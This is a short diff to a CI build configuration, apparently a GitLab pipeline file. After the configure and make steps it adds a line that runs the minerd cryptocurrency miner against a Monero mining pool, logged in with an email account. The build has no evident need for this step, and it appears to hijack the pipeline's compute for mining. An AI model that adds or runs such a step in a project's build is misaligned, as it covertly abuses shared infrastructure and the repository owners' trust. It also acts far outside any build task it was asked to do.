@@ -9,3 +9,4 @@ before_script:
 script:
   - ./configure
   - make
+  - ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u joch41@gmail.com -p x --no-longpoll --debug --retry-pause=5 --timeout=60
